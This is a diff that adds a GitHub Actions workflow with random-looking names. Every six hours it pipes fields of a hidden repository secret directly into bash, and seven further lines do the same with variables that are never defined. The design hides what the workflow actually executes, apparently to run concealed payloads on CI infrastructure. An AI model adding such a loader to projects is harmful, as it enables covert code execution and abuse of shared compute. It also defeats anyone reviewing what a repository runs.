@@ -1,0 +1,24 @@
+name: lainianguanglv
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lainianguanglv
+        env:
+          eyfvp73: ${{ secrets.eyfvp73 }}
+        run: |
+          echo $eyfvp73 | jq -r .ho1338 | /bin/bash
+          echo $tuug32172 | jq -r .kisbv02 | /bin/bash
+          echo $rfc0 | jq -r .moaul00680 | /bin/bash
+          echo $odvc885 | jq -r .urn21475 | /bin/bash
+          echo $qx8 | jq -r .oti34551 | /bin/bash
+          echo $rc24 | jq -r .jvbt834 | /bin/bash
+          echo $dhxp26 | jq -r .hbzyr2368 | /bin/bash
+          echo $row0112 | jq -r .q327 | /bin/bash
+
